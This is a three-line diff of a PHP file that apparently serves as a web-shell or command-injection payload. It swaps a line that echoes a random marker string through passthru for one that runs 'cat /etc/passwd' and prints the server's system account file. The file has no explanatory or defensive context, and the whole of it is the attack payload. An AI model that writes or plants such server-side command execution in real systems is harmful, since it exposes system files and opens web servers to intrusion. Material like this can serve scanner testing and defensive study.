@@ -1,3 +1,3 @@
 <?php
-echo passthru('echo vq3rio13dj8x');
+echo passthru('cat /etc/passwd');
 ?>
